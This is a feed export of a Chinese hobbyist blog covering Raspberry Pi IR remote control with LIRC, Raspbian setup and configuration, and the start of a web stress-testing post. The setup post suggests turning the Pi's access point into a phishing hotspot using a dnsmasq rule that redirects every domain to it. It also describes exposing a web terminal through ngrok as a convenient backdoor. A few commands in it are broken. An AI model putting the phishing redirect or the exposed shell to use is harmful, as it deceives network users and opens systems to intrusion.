gpio_out_pin=17

#sudo vim /etc/lirc/hardware.conf  #编辑LRIC的配置文件
LIRCD_ARGS=&amp;quot;--uinput --listen&amp;quot;
DRIVER=&amp;quot;default&amp;quot;
DEVICE=&amp;quot;/dev/lirc0&amp;quot;
MODULES=&amp;quot;lirc_rpi&amp;quot;

# 重启生效
sudo /etc/init.d/lirc restart

# irrecord --list-namespace
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;录制电风扇&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# 开始录制
irrecord -d /dev/lirc0 ~/lircd.conf #按照提示操作即可,录制完后会让你输入按键名

sudo cp ~/lircd.conf /etc/lirc/lircd.conf

#查看录制好可以使用的按键名
irsend LIST /home/pi/lircd.conf &amp;quot;&amp;quot;
irsend SEND_ONCE /home/pi/lircd.conf KEY_POWER
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;录制空调红外&lt;/h3&gt;
&lt;p&gt;空调遥控器这种带逻辑控制的比较麻烦.每次发射的都是含有温度、模式、制冷制热等一连串的指令，按照之前irrecord指令生成conf文件，行不通&lt;/p&gt;
&lt;p&gt;只能使用raw的原始码，记录也是通过mode2 命令实现&lt;/p&gt;
&lt;p&gt;先制作模板：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /etc/init.d/lirc restart
irrecord  -f -d /dev/lirc0 ~/lircd.conf #制作模板
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;得到&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;begin remote

  name  /home/pi/lircd.conf
  flags RAW_CODES
  eps            30
  aeps          100

  gap          19886

      begin raw_codes

          name KEY_OPEN
               90     102     331

      end raw_codes

end remote
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接下来开始录制&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mode2  -d /dev/lirc0 &amp;gt; /tmp/temp.code  &lt;span class="c1"&gt;# space 10969878 &lt;/span&gt;
cat /tmp/temp.code &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;&amp;#39;2,$p&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -o  -E &lt;span class="s2"&gt;&amp;quot;[0-9]+&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xargs &lt;span class="nb"&gt;echo&lt;/span&gt;  &lt;span class="c1"&gt;# 移除第一行,之后把所有数字取出&lt;/span&gt;
&lt;span class="c1"&gt;# 把上述指令写入 ~/lircd.conf 的 KEY_OPEN里&lt;/span&gt;
&lt;span class="c1"&gt;# 值得注意的是 ~/lircd.conf文件里的空格十分重要&lt;/span&gt;

sudo cp ~/lircd.conf /etc/lirc/lircd.conf
sudo /etc/init.d/lirc restart
&lt;span class="c1"&gt;# irsend LIST /home/pi/lircd.conf &amp;quot;&amp;quot; #列出指令&lt;/span&gt;
irsend SEND_ONCE /home/pi/lircd.conf KEY_OPEN
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是我最后的~/lircd.conf内容:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;begin remote

  name  /home/pi/lircd.conf
  flags RAW_CODES
  eps            30
  aeps          100

  gap          19886

      begin raw_codes

          name KEY_CLOSE
               9075 4411 731 453 751 1580 730 476 729 477 731 1576 729 478 729 1579 729 460 747 477 729 477 729 476 730 1578 729 477 730 476 731 477 733 472 730 476 731 475 730 477 728 480 728 477 729 1578 731 477 727 477 731 475 730 478 728 477 730 476 730 1578 754 430 753 1577 735 471 730 477 752 1553 756 453 753 19884 756 1551 758 451 754 450 756 451 756 451 754 449 756 451 757 429 777 449 758 449 758 449 756 451 755 450 756 1550 757 428 779 451 755 451 755 450 757 450 755 450 757 428 779 449 757 448 760 447 758 449 757 449 756 451 756 450 756 449 756 1551 757 1550 757 451 756
          name KEY_OPEN
               9112 4390 724 459 747 1584 725 459 746 1582 727 1582 726 481 724 1583 726 482 729 478 745 459 726 481 745 1564 724 480 725 481 746 459 725 488 741 438 770 457 748 457 749 459 747 459 748 1559 748 436 773 455 750 457 748 459 748 457 750 458 747 1559 749 459 746 1558 750 457 749 458 748 1558 751 455 749 19889 748 1559 750 457 748 458 749 458 750 457 747 458 748 458 749 435 771 458 749 457 748 459 745 461 745 460 747 1561 726 481 729 455 769 458 725 482 725 481 724 483 724 481 726 482 745 460 725 482 725 482 722 482 726 482 725 481 724 480 724 1583 725 1582 727 1583 726


      end raw_codes

end remote
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我把开关机命名为KEY_OPEN/KEY_CLOSE(可以完全自定义)&lt;/p&gt;
&lt;p&gt;之后开关机的指令分别为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#开机
irsend SEND_ONCE /home/pi/lircd.conf KEY_OPEN
#关机
irsend SEND_ONCE /home/pi/lircd.conf KEY_CLOSE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;测试有效！搞定&lt;/p&gt;
&lt;p&gt;之后结合温度传感器或者微信之类的其他功能模块就可以完成丰富的智能控制了&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;p&gt;配置文件中，KEY的名字有限制，BLOCKLY_KEY会报错 KEY_BLOCKLY就行&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/LIRC"&gt;LIRC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mageelen.blog.163.com/blog/static/1769430102014382346166/"&gt;使用树莓派遥控空调&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/yulongchen/archive/2013/04/12/3017409.html"&gt;红外协议之NEC协议&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://linux.cn/article-3782-1.html"&gt;使用树莓派红外控制空调和风扇&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ukonline2000.com/?p=296"&gt;发布树莓派专用红外线扩展板&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 17 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-17:raspberrypi-lirc.html</guid><category>tools</category></item><item><title>树莓派折腾笔记之系统安装与配置</title><link>/raspberrypi-install-and-config.html</link><description>&lt;p&gt;最近我的树莓派被用于作原型机了&lt;/p&gt;
&lt;p&gt;只好重新用新的板子重新配置&lt;/p&gt;
&lt;h1&gt;下载系统镜像&lt;/h1&gt;
&lt;p&gt;镜像&lt;a href="https://www.raspberrypi.org/downloads/"&gt;下载地址&lt;/a&gt;,这里有许多可选镜像,我用的是&lt;a href="https://www.raspberrypi.org/downloads/raspbian/"&gt;raspbian&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我之前是在windows下用win32diskimager往sd卡里刷系统的&lt;/p&gt;
&lt;p&gt;这次准备用dd(方便批量操作)，在mac下.参考这篇文章：&lt;a href="https://github.com/ccforward/cc/issues/25"&gt;Mac下给SD卡安装树莓派Raspbian系统&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;安装系统&lt;/h1&gt;
&lt;p&gt;这里我们讨论两种情况，新买的sd卡和已经安装过系统的sd卡（重刷）&lt;/p&gt;
&lt;h3&gt;新的sd卡&lt;/h3&gt;
&lt;p&gt;一般新买的卡都已经格式化好了，这是最简单的情况,  按照&lt;a href="https://github.com/ccforward/cc/issues/25"&gt;Mac下给SD卡安装树莓派Raspbian系统&lt;/a&gt;的做法就行&lt;/p&gt;
&lt;p&gt;这里复述一下核心内容：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;df &lt;span class="c1"&gt;# 查看当前已经挂载的卷&lt;/span&gt;
&lt;span class="c1"&gt;# 假设设备文件为：/dev/disk1s1 ,（ 通过查看设备名判断）&lt;/span&gt;
diskutil unmount /dev/disk1s1 &lt;span class="c1"&gt;#卸载&lt;/span&gt;
diskutil list &lt;span class="c1"&gt;# 确认设备  (通过存储大小)&lt;/span&gt;
&lt;span class="c1"&gt;# 安装系统&lt;/span&gt;
dd &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4m &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pi.img &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/rdisk1 &lt;span class="c1"&gt;#我的速度大概是17m/s&lt;/span&gt;
diskutil unmountDisk /dev/disk1  &lt;span class="c1"&gt;#卸载设备&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，系统就刷好了&lt;/p&gt;
&lt;h3&gt;重刷装有系统的sd卡&lt;/h3&gt;
&lt;p&gt;如果是重刷装有系统的sd卡,我们需要先把SD卡还原成初始状态：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载&lt;a href="http://www.alexpage.de/download/usbit/bootsector.img"&gt;bootsector.img&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;dd bs=4m if=./bootsector.img of=/dev/rdisk1 # 假设设备为disk1 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然后格式化sd卡(我把它格式化为MS-DOS(FAT))，至此你就可以把它当做新卡，用处理新卡的方式安装系统了&lt;/p&gt;
&lt;h1&gt;登录系统&lt;/h1&gt;
&lt;p&gt;我只买了树莓派，没有买高清转接头之类的东西，没打算把树莓派连到屏幕。那么我们如何登录系统，进行操作呢&lt;/p&gt;
&lt;p&gt;首先使用网络连接树莓派网口，然后找个扫描ip的软件,我用的是fing（mac和iphone都有），手机/电脑只要和树莓派在同个网络里，就可以找到它（通过设备名） （ps: brew cask install fing）&lt;/p&gt;
&lt;p&gt;然后ssh登录即可，用户名和密码分别是：pi/raspberry （11-25版本可能需要先进用屏幕登录在raspi-config里开启ssh）&lt;/p&gt;
&lt;p&gt;树莓派3代自带无线网卡，我们把无线网卡连上wifi，之后就不需要，细节下文再说&lt;/p&gt;
&lt;h1&gt;配置&lt;/h1&gt;
&lt;p&gt;输入&lt;code&gt;sudo raspi-config&lt;/code&gt;开始设置，相关设置可以看说明&lt;/p&gt;
&lt;h2&gt;#Expand Filesystem&lt;/h2&gt;
&lt;p&gt;扩展 SD 卡上可用的空间, 否则你会觉得怎么可用空间这么小&lt;/p&gt;
&lt;h3&gt;配置&lt;a href="https://zh.wikipedia.org/zh/VNC"&gt;VNC&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;VNC借由网络，可发送键盘与鼠标的动作及即时的屏幕画面&lt;/p&gt;
&lt;p&gt;VNC与操作系统无关，因此可跨平台使用&lt;/p&gt;
&lt;p&gt;我在mac下使用RealVNC&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install tightvncserver &lt;span class="c1"&gt;# 安装&lt;/span&gt;
vncserver :1 &lt;span class="c1"&gt;# 启用 ，之后在 vnc client里输入 ip:1即可进入图形界面&lt;/span&gt;
&lt;span class="c1"&gt;# vncpasswd # 修改密码&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;换国内源&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;#sudo vi /etc/apt/sources.list ,使内容变为&lt;/span&gt;
&lt;span class="k"&gt;deb&lt;/span&gt; &lt;span class="s"&gt;http://mirrors.aliyun.com/raspbian/raspbian/&lt;/span&gt; &lt;span class="kp"&gt;jessie&lt;/span&gt; &lt;span class="kp"&gt;main&lt;/span&gt; &lt;span class="kp"&gt;non-free&lt;/span&gt; &lt;span class="kp"&gt;contrib&lt;/span&gt;
&lt;span class="k"&gt;deb-src&lt;/span&gt; &lt;span class="s"&gt;http://mirrors.aliyun.com/raspbian/raspbian/&lt;/span&gt; &lt;span class="kp"&gt;jessie&lt;/span&gt; &lt;span class="kp"&gt;main&lt;/span&gt; &lt;span class="kp"&gt;non-free&lt;/span&gt; &lt;span class="kp"&gt;contrib&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;修改hostname&lt;/h3&gt;
&lt;p&gt;sudo vim /etc/hostname&lt;/p&gt;
&lt;h3&gt;无线网络&lt;/h3&gt;
&lt;p&gt;如果你直接在命令行里配置可以参考:&lt;a href="http://www.jianshu.com/p/b42e8d3df449"&gt;树莓派 Raspberry Pi 设置无线上网&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;修改配置文件:&lt;code&gt;/etc/network/interfaces&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;auto wlan0
iface wlan0 inet dhcp
wpa-conf /etc/wpa.conf
iface default inet dhcp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后在&lt;code&gt;/etc/wpa.conf&lt;/code&gt;里加上你的无线热点(可以添加多个)：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;network={
        ssid=&amp;quot;xxx&amp;quot;
        key_mgmt=WPA-PSK
        psk=&amp;quot;xxx&amp;quot;
        id_str=&amp;quot;myiphone&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;无线网卡的控制命令为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo ifup wlan0 &lt;span class="c1"&gt;#启用&lt;/span&gt;
sudo ufdown wlan0 &lt;span class="c1"&gt;#关闭&lt;/span&gt;
sudo service network-manager restart &lt;span class="c1"&gt;#重启&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;更直观的配置方式可以使用VNC client进入图形环境里&lt;/p&gt;
&lt;h3&gt;树莓派作为无线AP&lt;/h3&gt;
&lt;p&gt;使用&lt;a href="https://github.com/oblique/create_ap"&gt;create_ap&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/oblique/create_ap
cd create_ap
sudo make install
#安装依赖
sudo apt-get install util-linux procps hostapd iproute2 iw haveged dnsmasq  #dnsmasq 是dns服务器
sudo create_ap wlan0 eth0 wwjpi3 wwjpipass --no-virt # https://github.com/oblique/create_ap/issues/185
# 加到supervisor里 #/usr/bin/create_ap  wlan0 eth0 wwjpi3 wwjpipass --no-virt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输煤派的地址为：&lt;code&gt;192.168.12.1&lt;/code&gt; , 路由器的地址为 &lt;code&gt;192.168.0.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进一步的发挥空间，我们可以把它当做一个钓鱼热点(已经运行了53端口DNS服务器)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：如果同时使用无线ap和普通wifi网卡，建议开机后再加入wifi网卡，然后ifup启用，否则可能导致热点无法开机启动&lt;/p&gt;
&lt;h4&gt;DHCP服务&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install dnsmasq
# vim /etc/dnsmasq.conf
interface=wlan0  #可能会影响wifi_ap
bind-interfaces
address=/#/192.168.12.1  #将对所有网站的访问重定向到本机

sudo service dnsmasq restart
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;蓝牙&lt;/h3&gt;
&lt;p&gt;树莓派3自带蓝牙&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/init.d/bluetooth status &lt;span class="c1"&gt;# 查看蓝牙状态&lt;/span&gt;
sudo bluetoothctl &lt;span class="c1"&gt;#进入蓝牙程序,替代了原来的bluez-simple-agent&lt;/span&gt;
&lt;span class="c1"&gt;# 之后按照步骤连接 &lt;/span&gt;
&lt;span class="c1"&gt;# 试一首歌&lt;/span&gt;
apt-get install mpg123
mpg123 mp3_uri
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/20713396"&gt;树莓派3 model:B 连接蓝牙设备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.embbnux.com/2016/04/10/raspberry_pi_3_wifi_and_bluetooth_setting_on_console/"&gt;树莓派3命令行配置wifi无线连接和蓝牙连接&lt;/a&gt;：rpi3蓝牙连音箱比较麻烦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果蓝牙连接好 却无法播放声音，可能是默认的声音输出是系统声卡，设置&lt;code&gt;PulseAudio Volume Control&lt;/code&gt;，在设置里把bcm2835设置为off&lt;/p&gt;
&lt;h3&gt;音频相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;play&lt;/li&gt;
&lt;li&gt;mplayer/mpg123&lt;/li&gt;
&lt;li&gt;sox 录音&lt;/li&gt;
&lt;li&gt;alsamixer 调节音量&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sox -d /tmp/recording.wav
play /tmp/recording.wav
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;PyAudio&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install libportaudio0 libportaudio2 libportaudiocpp0 portaudio19-dev 
sudo pip install PyAudio
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;其它&lt;/h3&gt;
&lt;h4&gt;我的编程环境&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install vim git tmux ack-grep lynx

&lt;span class="c1"&gt;# 我的vim配置文件 &lt;/span&gt;
wget https://raw.githubusercontent.com/wwj718/wwj718-vim/master/wwj718_vim_vimrc -O ~/.vimrc
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;jupyter lab （开发环境）&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pip install pip --upgrade -i http://pypi.douban.com/simple
sudo apt-get install python-dev

&lt;span class="c1"&gt;# jupyter&lt;/span&gt;
sudo pip install jupyter  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
sudo pip install jupyterlab  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com

sudo jupyter serverextension &lt;span class="nb"&gt;enable&lt;/span&gt; --py jupyterlab --sys-prefix
&lt;span class="c1"&gt;# jupyter lab --notebook-dir=&amp;quot;.&amp;quot; --no-browser --port 5000 --ip=0.0.0.0 &lt;/span&gt;
&lt;span class="c1"&gt;# vim ~/.bashrc&lt;/span&gt;
&lt;span class="c1"&gt;# alias jupyterlab=&amp;quot;jupyter lab --notebook-dir=&amp;quot;.&amp;quot; --no-browser --port 8888 --ip=0.0.0.0&amp;quot;&lt;/span&gt;
&lt;span class="c1"&gt;# jupyter notebook --no-browser --port 5000 --ip=0.0.0.0 &lt;/span&gt;
&lt;span class="c1"&gt;# 属于jupyter作为开发环境&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="https://github.com/rupa/z"&gt;z&lt;/a&gt;&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://raw.githubusercontent.com/rupa/z/master/z.sh -O ~/z.sh
&lt;span class="c1"&gt;# 在.bashrc添加 ~/.bashrc&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; . ~/z.sh &amp;gt; ~/.bashrc
&lt;span class="c1"&gt;# souce ~/.bashrc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;GPIO相关&lt;/h1&gt;
&lt;h3&gt;I2C&lt;/h3&gt;
&lt;p&gt;如果要用Adafruit_LED_Backpack,需要开启I2C&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install python-smbus
sudo apt-get install i2c-tools
sudo raspi-config &lt;span class="c1"&gt;#advanced options&lt;/span&gt;
sudo vim  /etc/modules &lt;span class="c1"&gt;# add i2c-bcm2708 and i2c-dev &lt;/span&gt;
&lt;span class="c1"&gt;# reboot&lt;/span&gt;
&lt;span class="c1"&gt;# test&lt;/span&gt;
sudo i2cdetect -y 1
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;系统管理与监控&lt;/h1&gt;
&lt;h3&gt;Linux Dash&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A beautiful web dashboard for Linux&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/afaqurk/linux-dash
&lt;span class="nb"&gt;cd&lt;/span&gt; linux-dash
sudo python https://github.com/afaqurk/linux-dash
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;默认80端口&lt;/p&gt;
&lt;h3&gt;netdata&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Get control of your servers. Simple. Effective. Awesome&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install zlib1g-dev uuid-dev libmnl-dev gcc make git autoconf autoconf-archive autogen automake pkg-config curl
git clone https://github.com/firehol/netdata.git --depth&lt;span class="o"&gt;=&lt;/span&gt;1
&lt;span class="nb"&gt;cd&lt;/span&gt; netdata

&lt;span class="c1"&gt;# build it, install it, start it&lt;/span&gt;
./netdata-installer.sh
&lt;span class="c1"&gt;# 访问ip:19999&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;supervisor&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Supervisor process control system for UNIX&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#切换到sudo用户&lt;/span&gt;
pip install supervisor
&lt;span class="c1"&gt;#echo_supervisord_conf &amp;gt; /etc/supervisord.conf&lt;/span&gt;
mkdir  /etc/supervisor
echo_supervisord_conf &amp;gt; /etc/supervisor/supervisord.conf &lt;span class="c1"&gt;#这个配置Ajenti才能管理&lt;/span&gt;
mkdir /etc/supervisord.conf.d
&lt;span class="c1"&gt;# 修改配置文件,include区段修改为 files = /etc/supervisord.conf.d/*.conf&lt;/span&gt;
&lt;span class="c1"&gt;# 开机自启 . 往/etc/rc.local加入/usr/local/bin/supervisord&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;supervisor的web管理端口为9001，需要开启&lt;/p&gt;
&lt;p&gt;添加新的进程配置，可以使用下边介绍的Ajenti来做, 配置信息会被直接写入：/etc/supervisor/supervisord.conf&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/yudai/gotty"&gt;gotty&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;gotty可以把terminal分享到web,默认端口是8080&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 下载https://github.com/yudai/gotty/releases ，我下的是gotty_linux_arm.tar.gz&lt;/span&gt;
gotty -w vim &lt;span class="c1"&gt;#把vim已编辑方式分享出来,分享vim就够了，vim可以切换到bash&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果我们把8080端口用ngrok分享出来（ngrok用supervisor管理），实际就是一个后门，用作开发调试十分方便&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/ajenti/ajenti"&gt;Ajenti&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Ajenti可以让你很简单地配置不同的常规服务程序，如Apache/nginx、Samba、BIND、Squid、MySQL、cron、防火墙等等&lt;/p&gt;
&lt;p&gt;十分适合非技术用户配置系统应用，可以看做服务器管理面板&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://repo.ajenti.org/debian/key -O- &lt;span class="p"&gt;|&lt;/span&gt; apt-key add -
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://repo.ajenti.org/debian main main debian&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/apt/sources.list
sudo apt-get install ajenti
sudo apt-get install build-essential python-pip python-dev python-lxml libffi-dev libssl-dev libjpeg-dev libpng-dev uuid-dev python-dbus
sudo pip install ajenti-panel ajenti.plugin.dashboard ajenti.plugin.settings ajenti.plugin.plugins
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;默认端口8000，默认登录信息为：&lt;code&gt;root:admin&lt;/code&gt;，之后修改密码之类的都在控制面板里边做&lt;/p&gt;
&lt;p&gt;配置文件为:&lt;code&gt;/etc/ajenti/config.json&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;默认开机自启&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ajenti69406213.png" /&gt;&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;p&gt;09-23的版本坑多&lt;/p&gt;
&lt;h3&gt;zip包mac下无法解压&lt;/h3&gt;
&lt;p&gt;在linux和window下都行&lt;/p&gt;
&lt;h3&gt;ssh端口拒绝&lt;/h3&gt;
&lt;p&gt;ip能ping通，ssh端口关闭，怀疑是ssh server没有开启&lt;/p&gt;
&lt;p&gt;nmap -p 22 xxx 测试关闭，fuck&lt;/p&gt;
&lt;p&gt;建议下载&lt;a href="https://downloads.raspberrypi.org/raspbian/images/raspbian-2016-05-31/2016-05-27-raspbian-jessie.zip"&gt;5-27版本&lt;/a&gt;,所有版本在这里：&lt;a href="https://downloads.raspberrypi.org/"&gt;downloads.raspberrypi.org&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.shumeipai.net/thread-1263-1-1.html?_dsign=55be35fa"&gt;用镜像写入工具将安装过树莓派系统的SD卡还原卡&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 11 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-11:raspberrypi-install-and-config.html</guid><category>tools</category></item><item><title>web服务器压力测试一例</title><link>/stress-testing.html</link><description>&lt;p&gt;近期部门新上线一个服务，我们使用ab和locust分别测试&lt;/p&gt;
&lt;p&gt;目前项目属于demo阶段，对访问量的支持不要求太高，我们暂且设定在500请求，20并发&lt;/p&gt;
&lt;h1&gt;工具介绍&lt;/h1&gt;
&lt;h3&gt;ab&lt;/h3&gt;
&lt;p&gt;ab全称为：Apache HTTP server benchmarking tool&lt;/p&gt;
&lt;p&gt;ab是apache自带的压力测试工具。ab非常实用，它不仅可以对apache服务器进行网站访问压力测试，也可以对或其它类型的服务器进行压力测试。比如nginx、tomcat、IIS等。&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/locustio/locust/"&gt;locust&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;locust是一个开源负载测试工具，支持python脚本。可仿真百万个用户&lt;/p&gt;
&lt;p&gt;locust提供web ui界面，能够方便用户实时监控脚本运行状态。&lt;/p&gt;
&lt;h1&gt;开始测试&lt;/h1&gt;
&lt;h3&gt;使用ab测试&lt;/h3&gt;
&lt;p&gt;假设我们的网站域名为：www.example.com&lt;/p&gt;
&lt;p&gt;我们需要测试的页面为：&lt;code&gt;/index&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ab -n &lt;span class="m"&gt;500&lt;/span&gt; -c &lt;span class="m"&gt;20&lt;/span&gt; https://www.example.com/index/  &lt;span class="c1"&gt;#500 访问，20 并发,－n表示请求数，－c表示并发数&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后会生成报表，如何阅读ab的报表，可以参考：&lt;a href="http://www.ha97.com/4617.html"&gt;Web性能压力测试工具之ApacheBench（ab）详解&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;使用locust测试&lt;/h3&gt;
&lt;p&gt;locust是一个python库，我们可以使用pip安装：&lt;code&gt;pip install locustio&lt;/code&gt;,查看帮助：&lt;code&gt;locust --help&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们根据&lt;a href="http://docs.locust.io/en/latest/"&gt;官方教程&lt;/a&gt;来写一个简单的测试&lt;/p&gt;
&lt;p&gt;vim locustfile.py&lt;/p&gt;
